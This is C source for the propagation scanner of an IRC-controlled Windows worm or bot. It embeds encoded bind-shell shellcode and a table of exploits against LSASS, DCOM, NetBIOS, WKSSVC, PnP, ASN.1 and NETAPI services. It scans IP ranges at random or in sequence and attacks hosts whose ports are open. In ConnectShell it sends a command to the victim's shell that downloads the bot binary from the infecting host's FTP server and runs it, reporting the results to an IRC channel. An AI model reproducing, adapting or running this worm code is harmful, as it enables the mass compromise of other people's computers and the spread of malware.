#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_ADVSCAN

//bind shellcode
//pretty sure its from one of the lsass exploits, cant remember
char bindshell[] =
"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x7D\x01\x80\x34\x0A\x99\xE2\xFA"
"\xEB\x05\xE8\xEB\xFF\xFF\xFF"
"\x70\x95\x98\x99\x99\xC3\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"
"\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x12\xED\x87\xE1\x9A"
"\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6"
"\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D"
"\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A"
"\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58"
"\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0"
"\x71\x1E\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41"
"\xF3\x9C\xC0\x71\xED\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B"
"\x66\xCE\x75\x12\x41\x5E\x9E\x9B\x99\x9D\x4B\xAA\x59\x10\xDE\x9D"
"\xF3\x89\xCE\xCA\x66\xCE\x69\xF3\x98\xCA\x66\xCE\x6D\xC9\xC9\xCA"
"\x66\xCE\x61\x12\x49\x1A\x75\xDD\x12\x6D\xAA\x59\xF3\x89\xC0\x10"
"\x9D\x17\x7B\x62\x10\xCF\xA1\x10\xCF\xA5\x10\xCF\xD9\xFF\x5E\xDF"
"\xB5\x98\x98\x14\xDE\x89\xC9\xCF\xAA\x50\xC8\xC8\xC8\xF3\x98\xC8"
"\xC8\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xC8\x66\xCE\x79"
"\xCB\x66\xCE\x65\xCA\x66\xCE\x65\xC9\x66\xCE\x7D\xAA\x59\x35\x1C"
"\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59"
"\x5A\x71\x76\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD"
"\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC"
"\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xCD\xF1\xEB\xFC\xF8\xFD\x99\xD5"
"\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6"
"\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC\xED\xD8\x99\xFB\xF0"
"\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED"
"\x99\xFA\xF5\xF6\xEA\xFC\xEA\xF6\xFA\xF2\xFC\xED\x99";
static int bindshellsize=sizeof(bindshell);


// globals
ADVINFO advinfo[MAX_THREADS];
CRITICAL_SECTION CriticalSection; 

EXPLOIT exploit[]={
//	{name,		display name, port,	function, stats, enable ftp},
#ifndef NO_LSASS
	{"lsass445","Lsass445",	445,	lsass445,	0, TRUE},
#endif
#ifndef NO_NETBIOS
	{"netbios",	"NetBios",	139,	netbios,	0, FALSE},
	{"ntpass",	"NTPass",	445,	netbios,	0, FALSE},
#endif
#ifndef NO_DCOM
	{"dcom445",	"DCOM445",	445,	dcom,		0, TRUE},
	{"dcom135",	"DCOM135",	135,	dcom,		0, TRUE},
#endif
#ifndef NO_WKSSVC
	{"wkssvce",	"WKSSVCE",	135,	wkssvce,	0, TRUE},
	{"wkssvco",	"WKSSVCO",	135,	wkssvco,	0, TRUE},
	{"wkssvce445","WKSSVCE445",445,	wkssvce,	0, TRUE},
	{"wkssvco445","WKSSVCO445",445,	wkssvco,	0, TRUE},
#endif
#ifndef NO_PNP
	{"pnp445",	"PNP445",	445,	PnP445,		0, TRUE},
#endif
#ifndef NO_MSASN
	{"asn445",	"asn445",	445,	MSASN,		0, TRUE},
	{"asn139",	"asn139",	139,	MSASN,		0, TRUE},
#endif
#ifndef NO_NETAPI
	{"netapi1","NETAPI", 139, netapi, 0, TRUE},
	{"netapi2","NETAPI", 445, netapi, 0, TRUE},
#endif
	{NULL, NULL, 0, NULL, 0, FALSE}
};

SCANALL scanall[]={
	{"netapi1", true},
	{"netapi2",  true},
	{"dcom445", true},
	{"pnp445", true},
	{"asn445", true},
};

SCANALL ntscan[]={
	{"netbios", true},
	{"ntpass",  true},
};

#ifndef NO_MSASN
SCANALL asnscan[]={
	{"asn445", true},
	{"asn139",	true},
};
int asnscansize=(sizeof(asnscan)/sizeof(SCANALL));
#endif

#ifndef NO_WKSSVC
SCANALL wksescan[]={
	{"wkssvce", true},
	{"wkssvce445",  true},
};
SCANALL wksoscan[]={
	{"wkssvco", true},
	{"wkssvco445",  true},
};
int wksescansize=(sizeof(wksescan)/sizeof(SCANALL));
int wksoscansize=(sizeof(wksoscan)/sizeof(SCANALL));
#endif

int scanallsize=(sizeof(scanall)/sizeof(SCANALL));
int ntscansize=(sizeof(ntscan)/sizeof(SCANALL));

void ListExploitStats(void *conn, char *target, BOOL verbose, int total)
{
	IRC* irc=(IRC*)conn;
	char buffer[IRCLINE], buffer2[IRCLINE];

	int extotal = 0;

	sprintf(buffer, "%s Exploit Statistics:", scan_title);
	for(int i=0; exploit[i].port != 0; i++)
	{
		if (lstrcmpi(exploit[i].name,"banner"))
		{
			extotal += exploit[i].stats;
			sprintf(buffer2," %s: %d,",exploit[i].name,exploit[i].stats);
			strncat(buffer, buffer2, sizeof(buffer));
		}
	}
	//extotal += eftpsends;
	sprintf(buffer2, " Exploit FTPD: %d, Total: %d in %s.", eftpsends, extotal, Uptime(GetTickCount(),dwstarted));
	strncat(buffer, buffer2, sizeof(buffer));

	if (extotal > total)
		irc->privmsg(target,buffer);
	else
	{
		if (verbose) 
			irc->privmsg(target,buffer);
	}
	return;
}

BOOL ConnectShell(EXINFO exinfo, unsigned int connectport)
{
	int len;
	char recvbuf[1024];
	SOCKET sockfd;
	SOCKADDR_IN shell_addr;
	ZeroMemory(&shell_addr, sizeof(shell_addr));

	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = finet_addr(exinfo.ip);
	shell_addr.sin_port = fhtons(connectport);

	if ((sockfd = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return FALSE;
	if (fconnect(sockfd,(LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
		return FALSE;

	char mkdir_buff[400];

	len = frecv(sockfd, recvbuf, 1024, 0);

	char fname[_MAX_FNAME];
	sprintf(fname,"setup_%d%d%d%d%d.exe",rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
	_snprintf(mkdir_buff,sizeof(mkdir_buff),
		"echo open %s %d > i&echo user 1 1 >> i &echo get %s >> i &echo quit >> i &ftp -n -s:i &%s\r\n",
		(PrivateIP(exinfo.ip)?inip:exip),FTP_PORT,fname,fname);

	if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return FALSE;

	Sleep(500);
	_snprintf(mkdir_buff, sizeof (mkdir_buff), "%s\r\n", filename);

	if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return FALSE;

	len = frecv(sockfd, recvbuf, 1024, 0);
	fclosesocket(sockfd);
	return TRUE;
}

char *MakeIP(char *ip,BOOL Random,int Class)
{
	if(!ip)
		return NULL;

	static char retip[16];
	ZeroMemory(retip,sizeof(retip));

	char *tokens[4];
	char ipbuf[16];
	strncpy(ipbuf,ip,16);
	tokens[0]=strtok(ipbuf,".");
	if(!tokens[0])
		return NULL;
	for(int i=1;i<4;i++) {
		tokens[i]=strtok(NULL,".");
		if(!tokens[i])
			return NULL;
	}
	if (Class==1) //A Class
	{
		sprintf(retip,"%s.%s.%s.%s",tokens[0],(Random?"x":"0"),(Random?"x":"0"),(Random?"x":"0"));
	}
	else if (Class==2) //B Class
	{
		sprintf(retip,"%s.%s.%s.%s",tokens[0],tokens[1],(Random?"x":"0"),(Random?"x":"0"));
	}
	else if (Class==3) //C Class
		sprintf(retip,"%s.%s.%s.%s",tokens[0],tokens[1],tokens[2],(Random?"x":"0"));

	else
	{
		return NULL;
	}

	/*int ip1=-1,ip2=-1,ip3=-1,ip4=-1;
	if (strlen(ip) > 15) 
		return NULL;
	sscanf(ip,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);

	if (Class==1) //A Class
		sprintf(retip,"%s.%s.%s.%s",ip1,(Random?"x":"0"),(Random?"x":"0"),(Random?"x":"0"));

	else if (Class==2) //B Class
		sprintf(retip,"%s.%s.%s.%s",ip1,ip2,(Random?"x":"0"),(Random?"x":"0"));

	else if (Class==3) //C Class
		sprintf(retip,"%s.%s.%s.%s",ip1,ip2,ip3,(Random?"x":"0"));

	else
		return NULL;*/

	return retip;
}

void CurrentIP(void *conn, char *target, int threadnum)
{
	IRC* irc=(IRC*)conn;
	if (findthreadid(SCAN_THREAD) > 0) {
		IN_ADDR in;
		in.s_addr = advinfo[threadnum].ip;
		irc->privmsg(target,"%s Current IP: %s.",scan_title,finet_ntoa(in));
	} else 
		irc->privmsg(target,"%s Scan not active.",scan_title);
	return;
}

void CheckServers(ADVSCAN scan,void *conn)
{
	DWORD id;
	if(scan.exploit != -1) {
		if (exploit[scan.exploit].ftp) {
			if (findthreadid(FTPD_THREAD) == 0) {
				static FTP ftp;
				if (!staticftpd) {
					srand(GetTickCount());
					ftp.port = (rand()%48127)+1024;
				} else {
					ftp.port = ftpdport;
				}
				ftp.threads = 0;
				GetModuleFileName(0,ftp.filename,sizeof(ftp.filename));
				strncpy(ftp.requestname, filename, sizeof(ftp.requestname)-1);
				ftp.gotinfo=FALSE;
				strncpy(ftp.chan,scan.target,sizeof(ftp.chan)-1);
				ftp.silent=scan.silent;
				ftp.verbose=scan.verbose;
				ftp.conn=conn;
				ftp.threadnum=addthread(FTPD_THREAD,"%s Server started, Port: %i, File: %s.", ftp_title, ftp.port, ftp.filename);
				if (threads[ftp.threadnum].tHandle = CreateThread(NULL, 0, &ftpd, (LPVOID)&ftp, 0, &id)) {
					while (ftp.gotinfo == FALSE) 
						Sleep(50);
				}
			}
		}
	}

	return;
}

unsigned long AdvGetNextIP(int threadnum)
{
	DWORD host;

	memcpy(&host, &advinfo[threadnum].ip, 4);
	host = fntohl(host);
	host += 1;
	host = fhtonl(host);
	memcpy(&advinfo[threadnum].ip, &host, 4);

	return (advinfo[threadnum].ip);
}

unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum)
{
	int ip1=-1,ip2=-1,ip3=-1,ip4=-1;

	if (strlen(scanmask) > 15) 
		return 0;

	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();

	advinfo[threadnum].ip = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));

	return (advinfo[threadnum].ip);
}

BOOL AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay)
{
	
	IN_ADDR in;
	in.s_addr=ip;
	//no sense scanning ourself
	if (!strcmp(finet_ntoa(in),exip) || !strcmp(finet_ntoa(in),inip))
		return FALSE;

	SOCKADDR_IN sin;
	unsigned long blockcmd=1;

	SOCKET sock = fsocket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET) 
		return FALSE;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = fhtons((unsigned short)port);
	fioctlsocket(sock,FIONBIO,&blockcmd);
	fconnect(sock,(LPSOCKADDR)&sin,sizeof(sin));

	TIMEVAL timeout;
	timeout.tv_sec=delay;
	timeout.tv_usec=0;
	FD_SET rset;
	FD_ZERO(&rset);
	FD_SET(sock,&rset);

	int i = fselect(0,0,&rset,0,&timeout);
	fclosesocket(sock);

	if (i<=0) 
		return FALSE;
	else 
		return TRUE;
}

DWORD WINAPI AdvScanner(LPVOID param)
{
	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	IRC* irc=(IRC*)scan.conn;
	scanp->gotinfo = TRUE;
	advinfo[scan.threadnum].ip = finet_addr(scan.ip);

	//char buffer[LOGLINE]; 
	//char szSelfExe[MAX_PATH];


//	// FIX ME: Make this a standalone function
//	if (!FileExists(szLocalPayloadFile)) {
//		GetModuleFileName(0,szSelfExe,MAX_PATH);
//		CopyFile(szSelfExe,szLocalPayloadFile,FALSE);
//		// FIX ME: Make this copy to the same directory (could affect other stuff)
//	}

	CheckServers(scan,scan.conn);

	if (findthreadid(SCAN_THREAD) == 1)
	{
		DeleteCriticalSection(&CriticalSection); // just in case
		if (!InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x80000400))
		{
			// failed to initialize CriticalSection
			if (!scan.silent)
				irc->privmsg(scan.target,"%s Failed to initialize critical section, error: <%d>",scan_title,GetLastError());
			return 0;
		}
	}

	advinfo[scan.threadnum].info = TRUE;
	for (unsigned int i=1;i<=(scan.threads);i++)
	{
		scan.cthreadid = i;
		scan.cthreadnum = addthread(SCAN_THREAD,"%s %s:%d, Scan thread: %d, Sub-thread: %d.",scan_title,scan.ip, scan.port,scan.threadnum,scan.cthreadid); 
		threads[scan.cthreadnum].parent = scan.threadnum;
		if (threads[scan.cthreadnum].tHandle = CreateThread(0,0,&AdvPortScanner,(LPVOID)&scan,0,0)) {
			while (scan.cgotinfo == FALSE)
				Sleep(30);
		} else {
//			sprintf(buffer, "%s Failed to start worker thread, error: <%d>.",scan_title, GetLastError());
//			addlog(ERRORLOG,buffer);
		}

		Sleep(30);
	}

	if (scan.minutes != 0)
		Sleep(60000*scan.minutes);
	else 
		while (advinfo[scan.threadnum].info == TRUE) Sleep(2000);

	IN_ADDR in;
	in.s_addr = advinfo[scan.threadnum].ip;
	if (!scan.silent && scan.verbose)
		irc->privmsg(scan.target,"%s Finished at %s:%d after %d minute(s) of scanning.",scan_title, finet_ntoa(in), scan.port, scan.minutes);

	advinfo[scan.threadnum].info = FALSE;
	Sleep(3000);

	if (findthreadid(SCAN_THREAD) == 1) 
		DeleteCriticalSection(&CriticalSection);

	clearthread(scan.threadnum);

	ExitThread(0);
}



DWORD WINAPI AdvPortScanner(LPVOID param)
{
	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	IRC* irc=(IRC*)scan.conn;
	scanp->cgotinfo = TRUE;

	IN_ADDR in;
//	char logbuf[LOGLINE];

	int threadnum=scan.cthreadnum;
	int threadid=scan.cthreadid;

	srand(GetTickCount()); 
	while (advinfo[threads[threadnum].parent].info) {
		DWORD dwIP;
		
		if (scan.random)
			dwIP=AdvGetNextIPRandom(scan.ip,threads[threadnum].parent);
		else
			dwIP=AdvGetNextIP(threads[threadnum].parent);
		in.s_addr=dwIP;

//		sprintf(logbuf,"%s IP: %s:%d, Scan thread: %d, Sub-thread: %d.",scan_title,
//			finet_ntoa(in), scan.port, threads[threadnum].parent, threadid); 
//		sprintf(threads[threadnum].name, logbuf);

		if (AdvPortOpen(dwIP,scan.port,scan.delay) == TRUE) {
			if (scan.exploit == -1) {
				EnterCriticalSection(&CriticalSection); 

				if (!scan.silent)
					irc->privmsg(scan.target,"%s Portscan: %s:%d open.",scan_title,finet_ntoa(in),scan.port);

				LeaveCriticalSection(&CriticalSection);
			} else {
				EXINFO exinfo;

				sprintf(exinfo.ip, finet_ntoa(in));
				sprintf(exinfo.command, exploit[scan.exploit].command);
				sprintf(exinfo.chan, scan.target);
				exinfo.silent = scan.silent;
				exinfo.verbose = scan.verbose;
				exinfo.port = scan.port;
				exinfo.threadnum = threadnum;
				exinfo.exploit = scan.exploit;
				exploit[scan.exploit].exfunc(scan.target,irc,exinfo);
//				if (exploit[scan.exploit].exfunc(exinfo)) {
//					EnterCriticalSection(&CriticalSection); 
//
//					sprintf(logbuf,"[SCAN]: Finished with IP: %s, Port %d.",finet_ntoa(in),scan.port);
//					irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
//					addlog(logbuf);
//	
//					LeaveCriticalSection(&CriticalSection);
//				} else {
//					EnterCriticalSection(&CriticalSection); 
//
//					sprintf(logbuf,"[SCAN]: Failed to exploit IP: %s, Port %d.",finet_ntoa(in),scan.port);
//					irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
//					addlog(logbuf);
//	
//					LeaveCriticalSection(&CriticalSection);
//				}

			}
		}
		Sleep(2000);
	}
	clearthread(threadnum);

	ExitThread(0);
}
#endif
